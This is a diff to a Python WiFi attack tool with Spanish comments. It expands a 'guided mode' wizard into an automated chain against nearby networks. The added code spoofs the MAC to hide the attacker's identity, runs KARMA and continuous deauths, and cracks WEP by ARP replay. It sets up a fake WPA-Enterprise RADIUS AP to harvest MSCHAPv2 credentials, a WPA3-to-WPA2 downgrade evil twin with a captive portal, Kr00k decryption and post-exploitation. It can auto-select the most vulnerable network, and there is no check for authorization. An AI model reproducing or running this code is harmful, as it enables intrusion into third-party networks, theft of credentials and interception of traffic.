@@ -516,22 +516,34 @@ def select_wordlist():
 
 def modo_wizard():
     """
-    [W] Modo Guiado — Flujo 100% automático:
-    Detecta adaptador → Monitor → Escanea → Puntúa vulnerabilidades
-    → Exploit Engine automático → Restaura red → Muestra resultado
+    [W] Modo Guiado COMPLETO — Todos los ataques en un solo flujo automático:
+    MAC Spoof → Monitor → Probe Harvest → Scan → Score → Objetivo
+    → KARMA en background → Detección de tipo de red → Ataque apropiado:
+        WEP: ARP replay + crack
+        OPEN: reportar
+        Enterprise: RADIUS falso + EAP bypass
+        WPA3 puro: Dragonblood downgrade
+        WPA/WPA2: Evil Twin + Exploit Engine (10 fases) + Kr00k
+    → Post-explotación → Reporte HTML
     """
+    import threading as _thr
+
     os.system("clear")
     banner()
-    separador("MODO GUIADO — AUTOMATICO COMPLETO")
+    separador("MODO GUIADO — ARSENAL COMPLETO AUTOMATICO")
     print(f"""
-  {WHITE}Flujo totalmente automático:{END}
-  {GREEN}  1.{END} Detecta tu adaptador WiFi (TP-Link, Alfa, etc.)
-  {GREEN}  2.{END} Activa modo monitor automáticamente
-  {GREEN}  3.{END} Escanea todas las redes y puntúa vulnerabilidades
-  {GREEN}  4.{END} Tú eliges la red (o deja que ataque la más vulnerable)
-  {GREEN}  5.{END} Exploit Engine: WPS Pixie → PMKID → Handshake → Cracking
-  {GREEN}  6.{END} Muestra la clave si la encuentra
-  {GREEN}  7.{END} Restaura tu red al terminar
+  {WHITE}Flujo totalmente automático con TODOS los ataques:{END}
+  {GREEN}  1.{END} Falsifica tu MAC (stealth opcional)
+  {GREEN}  2.{END} Activa modo monitor y captura probes de dispositivos
+  {GREEN}  3.{END} Escanea redes y las puntúa por vulnerabilidad
+  {GREEN}  4.{END} Tú eliges el objetivo (o auto-selecciona el más vulnerable)
+  {GREEN}  5.{END} KARMA lanzado en background (captura otras redes)
+  {GREEN}  6.{END} Detecta tipo de red y lanza el ataque correcto:
+          {DIM}WEP → crack automático | OPEN → acceso directo
+          Enterprise → RADIUS falso | WPA3 → Dragonblood
+          WPA/WPA2 → Evil Twin + Exploit Engine 10 fases + Kr00k{END}
+  {GREEN}  7.{END} Post-explotación en la red comprometida
+  {GREEN}  8.{END} Genera reporte HTML profesional
     """)
 
     continuar = ask("¿Continuar? (s/n)")
@@ -545,15 +557,29 @@ def modo_wizard():
         error("No se detectó ninguna interfaz. Conecta tu adaptador WiFi.")
         pause_back(); return
 
-    # ── PASO 2: Activar monitor ───────────────────────────────────────────────
-    step(2, "Activando modo monitor")
+    # ── PASO 2: MAC Spoof (stealth) ───────────────────────────────────────────
+    step(2, "Anonimato — Falsificación de MAC")
+    tip("Cambiar la MAC oculta tu identidad real durante el ataque.")
+    do_spoof = ask("¿Falsificar MAC antes de atacar? (s/n)")
+    if do_spoof.lower() == 's':
+        octetos = [random.randint(0, 255) for _ in range(6)]
+        octetos[0] = octetos[0] & 0xFE   # bit unicast
+        mac_nueva = ':'.join(f'{o:02X}' for o in octetos)
+        run(f"ip link set {interfaz} down 2>/dev/null")
+        run(f"ip link set {interfaz} address {mac_nueva} 2>/dev/null")
+        run(f"ip link set {interfaz} up 2>/dev/null")
+        ok(f"MAC cambiada a: {CYAN}{mac_nueva}{END}")
+    else:
+        info("MAC original mantenida.")
+
+    # ── PASO 3: Activar monitor ───────────────────────────────────────────────
+    step(3, "Activando modo monitor")
     tip("Compatible con TP-Link, Alfa, Ralink, Realtek, Atheros...")
     sp = Spinner("Activando modo monitor...")
     sp.start()
     mon_iface = _enable_monitor(interfaz)
     sp.stop()
 
-    # Verificar modo monitor
     mode_check = run(f"iw dev {mon_iface} info 2>/dev/null | grep type", capture=True) or ""
     if "monitor" not in mode_check:
         error(f"No se pudo activar modo monitor en {mon_iface}.")
@@ -562,17 +588,42 @@ def modo_wizard():
         pause_back(); return
     ok(f"Modo monitor activo: {CYAN}{mon_iface}{END}")
 
-    # ── PASO 3: Escanear y puntuar ────────────────────────────────────────────
-    step(3, "Escaneando redes y analizando vulnerabilidades")
-    t_scan = 20
-    redes = quick_scan(mon_iface, t_scan)
+    # ── PASO 4: Probe Request Harvesting ─────────────────────────────────────
+    step(4, "Capturando Probe Requests de dispositivos cercanos")
+    tip("Los dispositivos buscan redes conocidas — los detectamos para recon.")
+    _probes_encontrados: dict = {}
+    if check_tool("tshark"):
+        sp_pr = Spinner("Capturando probes (15s)...")
+        sp_pr.start()
+        pr_out = run(
+            f"timeout 15 tshark -i {mon_iface} -Y 'wlan.fc.type_subtype==0x04' "
+            f"-T fields -e wlan.sa -e wlan.ssid 2>/dev/null",
+            capture=True
+        ) or ""
+        sp_pr.stop()
+        for _line in pr_out.strip().splitlines():
+            _parts = _line.strip().split("\t")
+            if len(_parts) >= 2:
+                _mac, _ssid = _parts[0].strip(), _parts[1].strip()
+                if validate_bssid(_mac) and _ssid:
+                    _probes_encontrados.setdefault(_mac, set()).add(_ssid)
+        if _probes_encontrados:
+            ok(f"Probe Harvest: {len(_probes_encontrados)} dispositivos detectados "
+               f"buscando {sum(len(v) for v in _probes_encontrados.values())} redes.")
+        else:
+            info("Sin probes detectados. Continuando.")
+    else:
+        info("tshark no disponible — omitiendo Probe Harvest.")
+
+    # ── PASO 5: Escanear + WPS + Puntuar ────────────────────────────────────
+    step(5, "Escaneando redes y analizando vulnerabilidades")
+    redes = quick_scan(mon_iface, 20)
     if not redes:
         error("No se detectaron redes. ¿El adaptador está en modo monitor?")
         run(f"airmon-ng stop {mon_iface} 2>/dev/null")
         run("systemctl start NetworkManager 2>/dev/null")
         pause_back(); return
 
-    # Verificar WPS
     wps_raw = ""
     if check_tool("wash"):
         sp2 = Spinner("Verificando WPS en redes encontradas...")
@@ -584,29 +635,31 @@ def modo_wizard():
         except Exception: pass
         sp2.stop()
 
-    # Puntuar y ordenar
     scored = []
     for r in redes:
         sc, vv = _score_network(r, [wps_raw])
         scored.append((sc, vv, r))
     scored.sort(key=lambda x: x[0], reverse=True)
 
-    # Mostrar tabla de vulnerabilidades
-    separador("REDES ENCONTRADAS — ORDENADAS POR VULNERABILIDAD")
+    separador("REDES DETECTADAS — ORDENADAS POR VULNERABILIDAD")
     print(f"  {WHITE}{'#':<4} {'ESSID':<24} {'SEGURIDAD':<12} {'SCORE':<7} {'VECTOR'}{END}")
     separador()
     for i, (sc, vv, r) in enumerate(scored, 1):
         col = RED if sc >= 80 else YELLOW if sc >= 50 else GREEN
+        # Marcar redes buscadas por probes
+        _probe_mark = f" {CYAN}[buscada]{END}" if any(
+            r['essid'] in ssids for ssids in _probes_encontrados.values()
+        ) else ""
         print(f"  {WHITE}[{i:>2}]{END} {CYAN}{r['essid'][:22]:<24}{END} "
               f"{YELLOW}{r['privacy'][:10]:<12}{END} "
-              f"{col}{sc:<7}{END} {DIM}{','.join(vv[:2])}{END}")
+              f"{col}{sc:<7}{END} {DIM}{','.join(vv[:2])}{END}{_probe_mark}")
     separador()
 
-    # ── PASO 4: Elegir objetivo ───────────────────────────────────────────────
-    step(4, "Selección de objetivo")
-    print(f"  {DIM}Escribe un número o presiona Enter para atacar la red más vulnerable ([1]){END}")
+    # ── PASO 6: Elegir objetivo ───────────────────────────────────────────────
+    step(6, "Selección de objetivo")
+    print(f"  {DIM}Enter = atacar la más vulnerable ([1]).  Las marcadas {CYAN}[buscada]{END}{DIM} tienen dispositivos que las necesitan.{END}")
     sel = ask("Número de red objetivo (Enter = más vulnerable)")
-    if sel == "" or sel == "1" or not sel.isdigit():
+    if sel == "" or not sel.isdigit():
         idx = 0
     else:
         idx = max(0, min(int(sel) - 1, len(scored) - 1))
@@ -615,75 +668,416 @@ def modo_wizard():
     bssid   = red_t["bssid"]
     channel = red_t["channel"]
     essid   = red_t["essid"]
+    priv    = red_t["privacy"].upper()
 
     separador(f"OBJETIVO: {essid}")
-    info(f"BSSID: {bssid}  Canal: {channel}  Score: {sc_t}  Vectores: {', '.join(vv_t)}")
+    info(f"BSSID: {bssid}  Canal: {channel}  Score: {sc_t}  Privacidad: {priv}")
+    info(f"Vectores: {', '.join(vv_t)}")
 
     # Wordlist
     wordlist = select_wordlist() or "/usr/share/wordlists/rockyou.txt"
 
-    # ── PASO 5: Lanzar Evil Twin en paralelo + Exploit Engine ────────────────
-    step(5, "Lanzando Exploit Engine + Evil Twin simultáneo")
-    print(f"  {DIM}Ambos ataques corren al mismo tiempo — gana el primero en obtener la clave.{END}\n")
+    clave  = None
+    metodo = None
 
-    import threading as _threading
-    _twin_result = {"clave": None}
-    _twin_stop   = _threading.Event()
+    # ─────────────────────────────────────────────────────────────────────────
+    # ── KARMA en background sobre el resto de redes ────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    _karma_stop  = _thr.Event()
+    _karma_procs = []
 
-    def _twin_worker():
-        if check_tool("airbase-ng") and check_tool("dnsmasq"):
-            c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
-                                   stop_event=_twin_stop, timeout_s=3600)
-            if c:
-                _twin_result["clave"] = c
-                _live_results_append(essid, bssid, c, "Evil Twin — portal cautivo")
+    def _karma_background():
+        """KARMA simplificado: mdk4 probe-response para atrapar otros clientes."""
+        if not check_tool("mdk4"):
+            return
+        try:
+            p = subprocess.Popen(
+                f"mdk4 {mon_iface} p 2>/dev/null",
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            _karma_procs.append(p)
+            _karma_stop.wait()
+            p.terminate()
+        except Exception:
+            pass
 
-    _tw = _threading.Thread(target=_twin_worker, daemon=True)
-    _tw.start()
-    ok(f"Evil Twin activo — AP '{CYAN}{essid}{END}' clonado, deauth continuo corriendo")
+    _karma_t = _thr.Thread(target=_karma_background, daemon=True)
+    _karma_t.start()
+    if check_tool("mdk4"):
+        ok(f"KARMA activo en background — capturando otras redes en el canal {channel}")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ── Detectar si el SSID es oculto ─────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    if not essid or essid in ("<oculto>", "<length: 0>", "") or essid.startswith("<length"):
+        step(7, "SSID oculto detectado — intentando revelarlo")
+        info("Enviando deauths para forzar reconexión de clientes...")
+        os.makedirs("handshakes", exist_ok=True)
+        _hidden_base = f"handshakes/hidden_{bssid.replace(':','')}"
+        _cap_proc_h = subprocess.Popen(
+            f"airodump-ng -c {channel} --bssid {bssid} -w {_hidden_base} {mon_iface}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        time.sleep(3)
+        for _rnd in range(3):
+            run(f"aireplay-ng -0 8 -a {bssid} {mon_iface} 2>/dev/null", capture=True)
+            time.sleep(3)
+        _cap_proc_h.terminate()
+        # Intentar extraer SSID
+        _cap_h = _hidden_base + "-01.cap"
+        if os.path.exists(_cap_h) and check_tool("tshark"):
+            _ssid_raw = run(
+                f"tshark -r {_cap_h} -Y 'wlan.bssid=={bssid} && wlan.ssid' "
+                f"-T fields -e wlan.ssid 2>/dev/null | sort -u | head -3",
+                capture=True
+            ) or ""
+            _ssids_found = [s.strip() for s in _ssid_raw.splitlines() if s.strip() and s.strip() != "0"]
+            if _ssids_found:
+                essid = _ssids_found[0]
+                ok(f"SSID revelado: {GREEN}{essid}{END}")
+            else:
+                essid = f"oculto_{bssid.replace(':','')[-6:]}"
+                warn(f"No se pudo revelar el SSID. Usando: {essid}")
+        else:
+            essid = f"oculto_{bssid.replace(':','')[-6:]}"
+
+    step_n = 8
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ── RAMA: RED ABIERTA ─────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    if "OPN" in priv or not priv:
+        step(step_n, "Red ABIERTA detectada — sin contraseña necesaria")
+        ok(f"La red '{essid}' no tiene contraseña (red abierta).")
+        info("Conéctese directamente y use [28] Post-Explotación para analizar la red.")
+        clave  = "SIN CONTRASEÑA"
+        metodo = "Red Abierta"
+        db_log_attack("Wizard OPEN", essid, bssid, channel, "abierta")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ── RAMA: WEP ────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    elif "WEP" in priv:
+        step(step_n, "WEP detectado — ataque automático ARP replay + crack")
+        info("WEP es trivialmente vulnerable. Iniciando ataque...")
+        os.makedirs("handshakes", exist_ok=True)
+        essid_s_wep = re.sub(r'[^\w\-]', '_', essid)
+        _wep_base = f"handshakes/wiz_wep_{essid_s_wep}"
+
+        # Fake auth
+        run(f"aireplay-ng -1 0 -a {bssid} -e {essid} {mon_iface} 2>/dev/null", capture=True)
+
+        # Captura en background
+        _wep_cap = subprocess.Popen(
+            f"airodump-ng -c {channel} --bssid {bssid} -w {_wep_base} {mon_iface}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        time.sleep(3)
+
+        sp_wep = Spinner("ARP replay — acumulando IVs (90s máx)...")
+        sp_wep.start()
+        try:
+            subprocess.run(
+                f"aireplay-ng -3 -b {bssid} -h {mon_iface} {mon_iface}",
+                shell=True, timeout=90, capture_output=True
+            )
+        except Exception:
+            pass
+        sp_wep.stop()
+        _wep_cap.terminate()
+        time.sleep(2)
+
+        _wep_cap_file = _wep_base + "-01.cap"
+        if os.path.exists(_wep_cap_file):
+            sp_wc = Spinner("Crackeando WEP con aircrack-ng...")
+            sp_wc.start()
+            _wep_res = run(f"aircrack-ng {_wep_cap_file} 2>/dev/null", capture=True) or ""
+            sp_wc.stop()
+            _wep_m = re.search(r'KEY FOUND.*?\[(.*?)\]', _wep_res, re.IGNORECASE)
+            if _wep_m:
+                clave  = _wep_m.group(1)
+                metodo = "WEP ARP-replay + aircrack"
+                ok(f"WEP CRACKEADA: {GREEN}{clave}{END}")
+            else:
+                warn("IVs insuficientes. Se necesitan más paquetes (100.000+ IVs).")
+        else:
+            warn("No se generó captura WEP.")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ── RAMA: WPA ENTERPRISE (802.1X/EAP) ────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    elif "MGT" in priv or "EAP" in priv or "ENTERPRISE" in essid.upper() or \
+         "CORP" in essid.upper() or "EDUROAM" in essid.upper():
+        step(step_n, "WPA Enterprise detectado — servidor RADIUS falso")
+        info("Levantando AP falso con EAP para capturar credenciales MSCHAPv2...")
+        tip("Los clientes sin 'ca_cert' configurado se conectarán y enviarán sus hashes.")
+
+        os.makedirs("/tmp/herradura_wiz_wpe", exist_ok=True)
+        _wpe_log   = "/tmp/herradura_wiz_wpe/wpe.log"
+        _wpe_creds = "/tmp/herradura_wiz_wpe/creds.txt"
+
+        _wpe_tool = "hostapd-wpe" if check_tool("hostapd-wpe") else \
+                    "hostapd"     if check_tool("hostapd")     else None
+        if not _wpe_tool:
+            warn("hostapd no disponible. Omitiendo Enterprise attack.")
+        else:
+            _wpe_conf = "/tmp/herradura_wiz_wpe/hostapd.conf"
+            with open(_wpe_conf, "w") as _f:
+                _f.write(f"interface={mon_iface}\ndriver=nl80211\nssid={essid}\n"
+                         f"hw_mode=g\nchannel={channel}\nieee8021x=1\neap_server=1\n"
+                         f"eap_user_file=/tmp/herradura_wiz_wpe/eap_users\n"
+                         f"ca_cert=/etc/hostapd-wpe/certs/ca.pem\n"
+                         f"server_cert=/etc/hostapd-wpe/certs/server.pem\n"
+                         f"private_key=/etc/hostapd-wpe/certs/server.key\n"
+                         f"private_key_passwd=whatever\ndh_file=/etc/hostapd-wpe/certs/dh\n"
+                         f"wpe_logfile={_wpe_log}\n")
+            with open("/tmp/herradura_wiz_wpe/eap_users", "w") as _f:
+                _f.write("* PEAP,TTLS,TLS,MD5,GTC\n\"t\" TTLS-MSCHAPV2 \"\" [2]\n")
+
+            _wpe_captured = []
+            _wpe_stop = _thr.Event()
+
+            def _mon_wpe():
+                _seen = set()
+                while not _wpe_stop.is_set():
+                    for _fp in [_wpe_log, _wpe_creds]:
+                        if os.path.exists(_fp):
+                            with open(_fp, "r", errors="ignore") as _lf:
+                                for _ln in _lf:
+                                    _h = hash(_ln.strip())
+                                    if _h in _seen or not _ln.strip(): continue
+                                    _seen.add(_h)
+                                    if any(x in _ln.lower() for x in
+                                           ["mschapv2","username","identity","password","credential"]):
+                                        _wpe_captured.append(_ln.strip())
+                    time.sleep(1)
+
+            _thr.Thread(target=_mon_wpe, daemon=True).start()
+            ok(f"AP Enterprise '{essid}' activo. Esperando clientes (120s)...")
+            warn("Los hashes MSCHAPv2 aparecerán si hay clientes vulnerables.")
+
+            try:
+                subprocess.run([_wpe_tool, _wpe_conf], timeout=120)
+            except (KeyboardInterrupt, subprocess.TimeoutExpired):
+                pass
+            _wpe_stop.set()
+
+            if _wpe_captured:
+                ok(f"Credenciales Enterprise capturadas: {len(_wpe_captured)}")
+                with open(_wpe_creds, "w") as _f:
+                    _f.write("\n".join(_wpe_captured))
+                clave  = _wpe_captured[0][:60]
+                metodo = "WPA Enterprise MSCHAPv2 hash"
+                if check_tool("asleap"):
+                    _wl = find_wordlist()
+                    if _wl:
+                        run(f"asleap -W {_wl} -C {_wpe_creds} 2>/dev/null")
+            else:
+                warn("Sin credenciales Enterprise capturadas.")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ── RAMA: WPA3 PURO (Dragonblood downgrade) ───────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    elif "WPA3" in priv and "WPA2" not in priv:
+        step(step_n, "WPA3 puro detectado — Dragonblood downgrade")
+        tip("Levantamos un AP WPA2 idéntico para forzar que el cliente haga downgrade.")
+        info("Si el cliente acepta WPA2, se conectará a nuestro AP y capturaremos la clave.")
+
+        os.makedirs("/tmp/herradura_wiz_dragon", exist_ok=True)
+        _drag_conf = "/tmp/herradura_wiz_dragon/hostapd.conf"
+        with open(_drag_conf, "w") as _f:
+            _f.write(f"interface={mon_iface}\ndriver=nl80211\nssid={essid}\n"
+                     f"hw_mode=g\nchannel={channel}\nwpa=2\n"
+                     f"wpa_passphrase=placeholder12345\nwpa_key_mgmt=WPA-PSK\n"
+                     f"wpa_pairwise=CCMP\nmacaddr_acl=0\n")
+
+        if check_tool("hostapd"):
+            _drag_stop = _thr.Event()
+            _drag_twin_res = {"clave": None}
+
+            def _dragon_twin():
+                # Levantar AP WPA2 clonado + deauth + portal
+                c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
+                                       stop_event=_drag_stop, timeout_s=300)
+                if c:
+                    _drag_twin_res["clave"] = c
+
+            _thr.Thread(target=_dragon_twin, daemon=True).start()
+
+            # Deauth continuo para forzar reconexión al AP falso
+            ok(f"AP WPA2 '{essid}' activo (downgrade WPA3→WPA2). Esperando 300s...")
+            _drag_deadline = time.time() + 300
+            while time.time() < _drag_deadline:
+                if _drag_twin_res["clave"]:
+                    break
+                run(f"aireplay-ng -0 3 -a {bssid} {mon_iface} 2>/dev/null", capture=True)
+                time.sleep(10)
+            _drag_stop.set()
+
+            if _drag_twin_res["clave"]:
+                clave  = _drag_twin_res["clave"]
+                metodo = "Dragonblood WPA3 Downgrade + portal"
+            else:
+                warn("Downgrade WPA3 sin resultado. La red puede estar completamente parcheada.")
+
+            if check_tool("dragonslayer"):
+                info("Intentando dragonslayer (timing side-channel)...")
+                _ds_out = run(
+                    f"timeout 60 dragonslayer -i {mon_iface} -b {bssid} -e {essid} -c {channel} 2>&1",
+                    capture=True
+                ) or ""
+                _ds_m = re.search(r'PSK[:\s]+["\']?([^\s"\']{6,})', _ds_out, re.I)
+                if _ds_m and not clave:
+                    clave  = _ds_m.group(1)
+                    metodo = "Dragonblood timing side-channel"
+        else:
+            warn("hostapd no disponible para Dragonblood. Continuando con Exploit Engine.")
+            # Fallback al exploit engine normal
+            _twin_r = {"clave": None}; _twin_s = _thr.Event()
+            def _tw_wpa3():
+                c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
+                                       stop_event=_twin_s, timeout_s=3600)
+                if c: _twin_r["clave"] = c
+            _thr.Thread(target=_tw_wpa3, daemon=True).start()
+            eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
+            clave, metodo = smart_exploit_target(eng)
+            _twin_s.set()
+            if not clave and _twin_r["clave"]:
+                clave, metodo = _twin_r["clave"], "Evil Twin portal"
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ── RAMA: WPA / WPA2 / WPA3+WPA2 — Ataque principal ─────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    else:
+        # ── Evil Twin en background ────────────────────────────────────────
+        step(step_n, "Lanzando Evil Twin en background + Exploit Engine")
+        print(f"  {DIM}Ambos ataques corren simultáneamente — gana el primero en obtener la clave.{END}\n")
+
+        _twin_result = {"clave": None}
+        _twin_stop   = _thr.Event()
+
+        def _twin_worker():
+            if check_tool("airbase-ng") and check_tool("dnsmasq"):
+                c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
+                                       stop_event=_twin_stop, timeout_s=3600)
+                if c:
+                    _twin_result["clave"] = c
+                    _live_results_append(essid, bssid, c, "Evil Twin — portal cautivo")
+
+        _thr.Thread(target=_twin_worker, daemon=True).start()
+        if check_tool("airbase-ng"):
+            ok(f"Evil Twin activo — AP '{CYAN}{essid}{END}' clonado, deauth continuo")
+        print()
+
+        # ── Exploit Engine (10 fases) ──────────────────────────────────────
+        eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
+        clave, metodo = smart_exploit_target(eng)
+
+        # ── Detener Evil Twin ──────────────────────────────────────────────
+        _twin_stop.set()
+        _thr.Thread(daemon=True, target=lambda: None).join  # flush
+        time.sleep(2)
+
+        if not clave and _twin_result["clave"]:
+            clave  = _twin_result["clave"]
+            metodo = "Evil Twin — portal cautivo"
+
+        # ── Kr00k (si el AP usa chip Broadcom/Cypress) ─────────────────────
+        if not clave:
+            _vendor_k = ""
+            try:
+                _vendor_k = urllib.request.urlopen(
+                    f"https://api.macvendors.com/{bssid}", timeout=3
+                ).read().decode().strip()
+            except Exception:
+                pass
+            _kr00k_susp = any(k in _vendor_k.upper()
+                              for k in ["BROADCOM","CYPRESS","APPLE","AMAZON"])
+            if _kr00k_susp and check_tool("airdecap-ng"):
+                info(f"Chip {_vendor_k} detectado — intentando Kr00k (CVE-2019-15126)...")
+                os.makedirs("kr00k", exist_ok=True)
+                _essid_s_k = re.sub(r'[^\w\-]', '_', essid)
+                _cap_kr = f"kr00k/wiz_{_essid_s_k}.pcap"
+                _cap_kr_p = subprocess.Popen(
+                    f"tcpdump -i {mon_iface} -w {_cap_kr} type data 2>/dev/null",
+                    shell=True
+                )
+                time.sleep(2)
+                for _ in range(5):
+                    run(f"aireplay-ng -0 3 -a {bssid} {mon_iface} 2>/dev/null", capture=True)
+                    time.sleep(0.5)
+                time.sleep(2)
+                _cap_kr_p.terminate()
+                _null_k = "00" * 16
+                _dec_kr = _cap_kr.replace(".pcap", "-dec.pcap")
+                run(f"airdecap-ng -l -b {bssid} -k {_null_k} {_cap_kr} 2>/dev/null", capture=True)
+                if os.path.exists(_dec_kr) and os.path.getsize(_dec_kr) > 0:
+                    ok(f"Kr00k: frames descifrados con clave nula → {_dec_kr}")
+                    if check_tool("tshark"):
+                        _kr_data = run(
+                            f"tshark -r {_dec_kr} -Y 'http or dns' "
+                            f"-T fields -e ip.src -e dns.qry.name "
+                            f"-e http.host 2>/dev/null | head -10",
+                            capture=True
+                        ) or ""
+                        if _kr_data.strip():
+                            info(f"Tráfico descifrado:{END}\n{CYAN}{_kr_data}{END}")
+                    clave  = f"Kr00k OK → {_dec_kr}"
+                    metodo = "Kr00k CVE-2019-15126"
+                else:
+                    info("Kr00k: AP no vulnerable o sin datos en buffer.")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Detener KARMA background
+    # ─────────────────────────────────────────────────────────────────────────
+    _karma_stop.set()
+    for _kp in _karma_procs:
+        try: _kp.terminate()
+        except Exception: pass
+
     print()
 
-    eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
-    clave, metodo = smart_exploit_target(eng)
-
-    # Detener Evil Twin
-    _twin_stop.set()
-    _tw.join(timeout=8)
-
-    # Si el Exploit Engine no encontró nada pero Evil Twin sí
-    if not clave and _twin_result["clave"]:
-        clave  = _twin_result["clave"]
-        metodo = "Evil Twin — portal cautivo"
-
-    print()
-
-    # ── PASO 6: Resultado ─────────────────────────────────────────────────────
+    # ── RESULTADO ─────────────────────────────────────────────────────────────
     os.system("clear")
     if clave:
         print(f"""
-{GREEN}╔{'═'*54}╗
-║{'★  CLAVE ENCONTRADA  ★':^54}║
-╠{'═'*54}╣
-║  Red    : {CYAN}{essid[:40]:<40}{GREEN}  ║
-║  BSSID  : {WHITE}{bssid:<40}{GREEN}  ║
-║  Clave  : {WHITE}{clave[:40]:<40}{GREEN}  ║
-║  Método : {DIM}{metodo[:40]:<40}{GREEN}  ║
-╚{'═'*54}╝{END}
+{GREEN}╔{'═'*58}╗
+║{'★  CLAVE ENCONTRADA  ★':^58}║
+╠{'═'*58}╣
+║  Red    : {CYAN}{essid[:44]:<44}{GREEN}  ║
+║  BSSID  : {WHITE}{bssid:<44}{GREEN}  ║
+║  Clave  : {WHITE}{clave[:44]:<44}{GREEN}  ║
+║  Método : {DIM}{metodo[:44]:<44}{GREEN}  ║
+╚{'═'*58}╝{END}
 """)
-        aid = db_log_attack("Wizard Auto", essid, bssid, channel, f"crackeada:{clave}")
+        aid = db_log_attack("Wizard Completo", essid, bssid, channel, f"crackeada:{clave}")
         db_log_password(aid, essid, bssid, clave, metodo)
         ok("Guardado en historial — usa [29] Ver historial o [30] Reporte HTML.")
     else:
         separador("RESULTADO")
-        warn("No se encontró la clave con los vectores disponibles.")
-        tip("La red puede tener contraseña robusta. Prueba con un diccionario mayor.")
-        tip("Wordlists: /usr/share/wordlists/ o github.com/danielmiessler/SecLists")
+        warn("No se encontró la clave con ninguno de los vectores disponibles.")
+        tip("La red tiene contraseña robusta o protecciones activas.")
+        tip("Prueba con un diccionario más grande: github.com/danielmiessler/SecLists")
 
     input(f"\n  {DIM}Presiona Enter para continuar...{END}")
 
-    # ── PASO 7: Restaurar red ─────────────────────────────────────────────────
-    step(6, "Restaurando conexión de red")
-    sp3 = Spinner("Desactivando modo monitor...")
+    # ── POST-EXPLOTACIÓN (si se obtuvo la clave) ──────────────────────────────
+    if clave and metodo not in ("Kr00k CVE-2019-15126",):
+        separador("POST-EXPLOTACIÓN")
+        print(f"  {DIM}Con la clave obtenida puedes conectarte a la red y analizar dispositivos.{END}")
+        do_post = ask("¿Ejecutar Post-Explotación ahora? (conectate primero a la red) (s/n)")
+        if do_post.lower() == 's':
+            # Restaurar red primero para poder conectarse
+            run(f"airmon-ng stop {mon_iface} 2>/dev/null")
+            run(f"ip link set {mon_iface} down 2>/dev/null; iw dev {mon_iface} set type managed 2>/dev/null; ip link set {mon_iface} up 2>/dev/null")
+            run("systemctl start NetworkManager 2>/dev/null; service networking restart 2>/dev/null")
+            ok(f"Red restaurada. Conéctate a '{essid}' con la clave: {GREEN}{clave}{END}")
+            input(f"\n  {DIM}Conéctate a la red y luego presiona Enter para iniciar post-explotación...{END}")
+            post_explotacion()
+            return   # post_explotacion ya tiene pause_back al final
+
+    # ── PASO FINAL: Restaurar red ─────────────────────────────────────────────
+    sp3 = Spinner("Desactivando modo monitor y restaurando red...")
     sp3.start()
     run(f"airmon-ng stop {mon_iface} 2>/dev/null")
     run(f"ip link set {mon_iface} down 2>/dev/null; iw dev {mon_iface} set type managed 2>/dev/null; ip link set {mon_iface} up 2>/dev/null")
@@ -691,9 +1085,9 @@ def modo_wizard():
     sp3.stop()
     ok("Red restaurada. Ya puedes navegar normalmente.")
 
-    separador("MODO GUIADO COMPLETADO")
+    separador("MODO GUIADO COMPLETO")
     gen = ask("¿Generar reporte HTML? (s/n)")
-    if gen.lower() == "s":
+    if gen.lower() == 's':
         generate_report()
     else:
         pause_back()
